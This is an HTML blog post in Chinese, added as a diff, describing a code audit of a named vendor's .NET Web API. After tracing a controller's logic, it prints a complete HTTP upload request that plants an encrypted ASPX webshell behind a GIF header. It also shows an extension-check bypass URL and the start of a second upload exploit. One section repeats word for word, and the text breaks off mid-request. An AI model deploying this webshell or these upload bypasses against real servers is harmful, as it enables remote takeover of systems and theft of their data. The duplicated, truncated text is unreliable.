@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="- 前言公司：北京中庆现代技术股份有限公司 由于该站的所有敏感数据的后端交互都是通关webapi实现的，所以我们直接去看这些api就好了 我个人在审代码时喜欢把每个控制器都看一遍 举例 首先是第一个控制器：StartAnalyticalEngine.cs  这里通过post方式接收以传入的实例化上面那个startAnalyticalVo类的对象  然后调用静态NbGuard类的的MakeSureI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次有关dotnet的代码审计[webapi]">
+<meta property="og:url" content="http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="塔菲">
+<meta property="og:description" content="- 前言公司：北京中庆现代技术股份有限公司 由于该站的所有敏感数据的后端交互都是通关webapi实现的，所以我们直接去看这些api就好了 我个人在审代码时喜欢把每个控制器都看一遍 举例 首先是第一个控制器：StartAnalyticalEngine.cs  这里通过post方式接收以传入的实例化上面那个startAnalyticalVo类的对象  然后调用静态NbGuard类的的MakeSureI">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/04/6de88c3153897838.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/7be9b90c387ba09b.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/3714f7c403101cbd.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/625ecaef9b38ac9b.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/67af3b3f5cea3785.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/f569b8d10a462655.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/5a4f4d77aa7ccb0c.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/1158c42c739be4e8.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/542a68c48b132d57.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/cd66c894225891ad.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/7f6d23cb2c4e1b01.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/56da00bd8bd6c180.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/7446447388487e6d.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/681ef30f3868b8c3.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/4970fbee4a940f01.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/08e5de50e44fcec1.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/a144fe0bf47c3af5.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/a144fe0bf47c3af5.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/dc3e91d5488dce55.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/a6016bdcea261b2f.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/07/cdb023d426771426.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/ecd5b1861a2260a403fcffb94727f1dc.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/eeea76b983b0178a96ad875a9c10d97e.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/1fff3c4bb8084ec8fa0d1839d2b1b930.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/577b46cac2e8386ae86a6f8a0ec5104e.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/c6a18fde87e56e300581114defff8553.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/b9b57cc79f40b29f1f1d6b56fbdcdf2d.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/990f73fb18b1441d4229556a67adf294.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/f5491228608a41b7427597ab4d1fd991.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/beae5297fe0b229968411737284cdb8b.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/18bce06624ebf2a63a6b6bb325ed461b.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/a5384c8ea5c7c0f303537961d29dd59e.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/626566590dfb22def97a39eb74a3679a.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/de24b3def0b2caa111e17368fd19cd64.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/54a9dfea8fe51ba10594b2aafc80509a.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/d5efefac1bb5a8c1bee61dd4fb1f2b63.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/ae47d65b9e1f175ef8c62049c36eca40.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/ed5e0a962da5b6e79eccc426980428cd.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/502cc7d689129a9ec26dfe30ed7c0339.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/810567d7367e2de8523fe0c1613a6dd0.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/4bc12e821502c432d6fc9e71135a452c.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/23dde82ac75bc095ef1cffaa21151992.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/763d41c6e878a7286aab3cabb81cb8bd.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/c5c7be5c4d9e4b72a7b9e607f2eec42b.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/9be30144671c78f7a0427ed82e806f9e.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/022c727a343c9cbd6d2692fe4f3d23b3.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/a6b84837847adeaa6df2fdba7ac28c2e.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/391c70cd02040643803bbcadaae1455d.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/39f70c55d5ef35384857a27e8c6ecb90.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe3XYF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe3XYF.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/18d2b53aad443ad6557b783fa9b0a904.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8Cex.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8kFO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8AYD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8BkT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8DtU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8rhF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe861J.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8cc9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8Rn1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8W0x.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe8f76.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/03/07/ppe84AK.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/e639c6b22c75ab570ef21f4e7fe3567a.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/8284763eeedb49c03981bd29cc3cc48a.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/9649d0b186d1b02c023a18c253e5ccb8.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/667c41908fa8dc9db48ace6cc79fdae9.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/c612a42b0009b3ee8303cac1235edbee.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/07167c683b49c40b09a6801284c1f0f0.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/ffae20c0e7431c4b713f474db1e155ef.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/2ab241bcda108b85a651bc164c6dee19.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/cf851a665af2eea611f7b69824bbc4ae.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/2dc339b3d25b6f7ab96e8ad5edcb1a04.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/f6a73f631a140f6c47702722aa4981ba.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/e9a3553291006f72ce2ad4cf515a5f7d.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/86c5468317ff5e9739ae2b7acb6b1fe5.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/de4838ba1bb27e995bcda3604d27a541.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/9c31872408be95380777678d21d7c94d.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/79fec83390693437b2f65183450593b8.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/577a1178610a63972ae804c72a9fa635.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/1f74545df9f6a23be0b41eb196fab401.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/ab08cdd490241c1fbac4489919a5f6ae.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/203284017ce315db178ff93fa8c81d28.png">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/07/f89122bfba0d5deea51cb74a62933d79.png">
+<meta property="article:published_time" content="2023-04-15T11:48:47.000Z">
+<meta property="article:modified_time" content="2023-06-06T01:23:20.881Z">
+<meta property="article:author" content="塔菲">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/03/04/6de88c3153897838.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一次有关dotnet的代码审计[webapi]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/04/15/%E6%9F%90%E5%A5%97java%E9%A1%B9%E7%9B%AE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/04/15/hexo%5BMatery%5D%E6%9C%AA%E5%8A%A0%E5%AF%86-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=一次有关dotnet的代码审计[webapi]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=一次有关dotnet的代码审计[webapi]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次有关dotnet的代码审计[webapi]&body=Check out this article: http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=一次有关dotnet的代码审计[webapi]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=一次有关dotnet的代码审计[webapi]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1"><span class="toc-number">3.</span> <span class="toc-text">文件上传 * 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1-1"><span class="toc-number">4.</span> <span class="toc-text">文件上传 * 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2"><span class="toc-number">5.</span> <span class="toc-text">文件上传 * 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-3%EF%BC%88%E5%8E%9F%E7%90%86%E5%90%8C-2%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">文件上传 * 3（原理同 2）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E8%B6%8A%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">前台越权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">8.</span> <span class="toc-text">任意密码重置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">9.</span> <span class="toc-text">任意文件下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BESSRF"><span class="toc-number">10.</span> <span class="toc-text">无回显SSRF</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        一次有关dotnet的代码审计[webapi]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">塔菲</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-15T11:48:47.000Z" class="dt-published" itemprop="datePublished">2023-04-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>-</p>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>公司：北京中庆现代技术股份有限公司</p>
+<p>由于该站的所有敏感数据的后端交互都是通关webapi实现的，所以我们直接去看这些api就好了</p>
+<p>我个人在审代码时喜欢把每个控制器都看一遍</p>
+<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p><img src="https://s3.bmp.ovh/imgs/2023/03/04/6de88c3153897838.png"></p>
+<p>首先是第一个控制器：StartAnalyticalEngine.cs</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/7be9b90c387ba09b.png"></p>
+<p>这里通过post方式接收以传入的实例化上面那个startAnalyticalVo类的对象</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/3714f7c403101cbd.png"></p>
+<p>然后调用静态NbGuard类的的MakeSureIsNotDefault方法，把ClassroomId属性值传入<img src="https://s3.bmp.ovh/imgs/2023/03/07/625ecaef9b38ac9b.png"></p>
+<p>然后调用了Object的equals方法</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dadati/article/details/107590043">https://blog.csdn.net/dadati/article/details/107590043</a></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/67af3b3f5cea3785.png"></p>
+<p>因为结果为false，故没有执行如下内容抛出异常</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/f569b8d10a462655.png"></p>
+<p>紧接着判断我们是否传入loginname，且IsNullOrWhiteSpace判断是否是空或者空格</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/5a4f4d77aa7ccb0c.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/1158c42c739be4e8.png"></p>
+<p>然后将loginname输入的内容执行linq to SQL操作判断用户名是否存在，不存在返回：未找到该用户</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/542a68c48b132d57.png"></p>
+<p>存在则</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/cd66c894225891ad.png"></p>
+<p>我们首先跟过去看_userSimpleFacade类的GetUserByLoginName方法，看看传入的loginname执行了哪些操作</p>
+<p>由于我们是以userByLoginName来接收，他是UserVo类的实例化，故GetUserByLoginName的返回类型也是该类方法，所以是第一个public UseVo xxx那个方法，定位过去</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/7f6d23cb2c4e1b01.png"></p>
+<p>这里我们传入的loginname紧接着执行了_userService.GetByLoginName方法</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/56da00bd8bd6c180.png"></p>
+<p>如图，这里就是<em>Lambda</em>的标准用法，有时候,<em>Linq和Lambda</em>是可以替换使用，用来操作数据库</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/7446447388487e6d.png"></p>
+<p>这里必须说明一点就是Linq to SQL语法执行的所有查询操作都是防止SQL注入的</p>
+<p><a target="_blank" rel="noopener" href="https://www.likecs.com/show-305961556.html">https://www.likecs.com/show-305961556.html</a></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/681ef30f3868b8c3.png"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46795297/article/details/105856777">https://blog.csdn.net/m0_46795297/article/details/105856777</a></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/4970fbee4a940f01.png"></p>
+<p>如果我们的loginname用户名不存在，则返回null</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/08e5de50e44fcec1.png"></p>
+<p>存在则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_usersHelper.MakeUserVo(user);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/a144fe0bf47c3af5.png"></p>
+<p>举例结束，以下是实战中漏洞挖掘</p>
+<h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传 * 1"></a>文件上传 * 1</h4><p>POST /api/Slides/PostFile HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/javascript, /; q=0.01<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: multipart/form-data; boundary=—————————302396729617880385421779606360<br>Content-Length: 783<br>Connection: close</p>
+<p>—————————–302396729617880385421779606360<br>Content-Disposition: form-data; name=”_slide”; filename=”1.aspx”<br>Content-Type: image/jpeg</p>
+<p>GIF89a<br>&lt;%@ Page Language=”C#” %&gt;&lt;%@Import Namespace=”System.Reflection”%&gt;&lt;%Session.Add(“k”,”e45e329feb5d925b”); /该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond/byte[] k = Encoding.Default.GetBytes(Session[0] + “”),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(“U”).Equals(this);%&gt;<br>—————————–302396729617880385421779606360<br>Content-Disposition: form-data; name=”savePath”</p>
+<p>—————————–302396729617880385421779606360–</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_usersHelper.MakeUserVo(user);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/a144fe0bf47c3af5.png"></p>
+<p>举例结束，以下是实战中漏洞挖掘</p>
+<h4 id="文件上传-1-1"><a href="#文件上传-1-1" class="headerlink" title="文件上传 * 1"></a>文件上传 * 1</h4><p>POST /api/Slides/PostFile HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/javascript, /; q=0.01<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: multipart/form-data; boundary=—————————302396729617880385421779606360<br>Content-Length: 783<br>Connection: close</p>
+<p>—————————–302396729617880385421779606360<br>Content-Disposition: form-data; name=”_slide”; filename=”1.aspx”<br>Content-Type: image/jpeg</p>
+<p>GIF89a<br>&lt;%@ Page Language=”C#” %&gt;&lt;%@Import Namespace=”System.Reflection”%&gt;&lt;%Session.Add(“k”,”e45e329feb5d925b”); /该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond/byte[] k = Encoding.Default.GetBytes(Session[0] + “”),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(“U”).Equals(this);%&gt;<br>—————————–302396729617880385421779606360<br>Content-Disposition: form-data; name=”savePath”</p>
+<p>—————————–302396729617880385421779606360–</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/dc3e91d5488dce55.png"></p>
+<p>很直接的一个文件上传，如果存在参数savePath，那么直接拼接在保存文件路径上，可支持跨目录</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/a6016bdcea261b2f.png"></p>
+<p>这里有必要提一下如果这里</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/03/07/cdb023d426771426.png"></p>
+<p>的上传限制不是indexof，而是GetExtension，那么就会造成漏洞，比如ueditor的aspx版本</p>
+<p><a target="_blank" rel="noopener" href="http://xxxx.com/123.jpg?shell.aspx">http://xxxx.com/123.jpg?shell.aspx</a></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/ecd5b1861a2260a403fcffb94727f1dc.png" alt="ecd5b1861a2260a403fcffb94727f1dc.png"></p>
+<p>这里就是由于GetExtension获取到的是.jpg，绕过了后缀限制</p>
+<h4 id="文件上传-2"><a href="#文件上传-2" class="headerlink" title="文件上传 * 2"></a>文件上传 * 2</h4><p>POST /api/imageWidget/ImageUpload/UploadImageResize?id=1&amp;avatarType=SiteAvatar&amp;subCategory=1&amp;newHeight=144&amp;newWidth=256&amp;saveExtension=aspx  HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: multipart/form-data; boundary=—————————6284831143977417611477572513<br>Content-Length: 52131<br>Connection: close</p>
